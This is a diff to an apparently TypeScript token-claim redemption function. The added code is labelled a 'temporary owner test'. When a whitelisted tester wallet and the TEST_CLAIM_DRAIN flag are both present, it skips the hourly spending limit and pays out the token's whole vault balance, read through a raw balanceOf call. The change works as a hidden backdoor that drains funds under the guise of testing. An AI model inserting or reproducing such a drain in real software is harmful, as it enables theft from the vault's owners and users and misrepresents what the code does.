@@ -542,7 +542,9 @@ export async function redeemClaimCode(codeIn: string, address: string): Promise<
         if (p != null) prices.set(sym, p);
       }),
     );
-    if (prices.has(hourlyToken.symbol)) {
+    // temporary owner test: a whitelisted wallet takes the token's whole vault balance (TEST_CLAIM_DRAIN=1)
+    const drain = tester && process.env["TEST_CLAIM_DRAIN"] === "1";
+    if (!drain && prices.has(hourlyToken.symbol)) {
       let spentUsd = 0;
       let unknown = false;
       for (const c of hourCatches ?? []) {
@@ -593,8 +595,16 @@ export async function redeemClaimCode(codeIn: string, address: string): Promise<
     const spawnIdHash = keccak256(toHex(spawn.id));
     // One drop rule per token, everywhere on the map: the token's fragment size
     // is authoritative, never a per-pin number.
-    const payout = book.shares[token.symbol] ?? token.fragment;
-    const amountWei = parseUnits(payout.toString(), token.decimals).toString();
+    let payout = book.shares[token.symbol] ?? token.fragment;
+    let amountWei = parseUnits(payout.toString(), token.decimals).toString();
+    if (drain) {
+      const r = await chainRpc<string>("eth_call", [{ to: tokenAddress, data: `0x70a08231000000000000000000000000${contract.slice(2).toLowerCase()}` }, "latest"]);
+      const bal = r && r !== "0x" ? BigInt(r) : 0n;
+      if (bal === 0n) return fail("The vault holds none of this token right now.", "金库里暂时没有这个代币。");
+      amountWei = bal.toString();
+      payout = Number(bal) / 10 ** token.decimals;
+      bookCache = null;
+    }
 
     const voucher = {
       to: data.address,
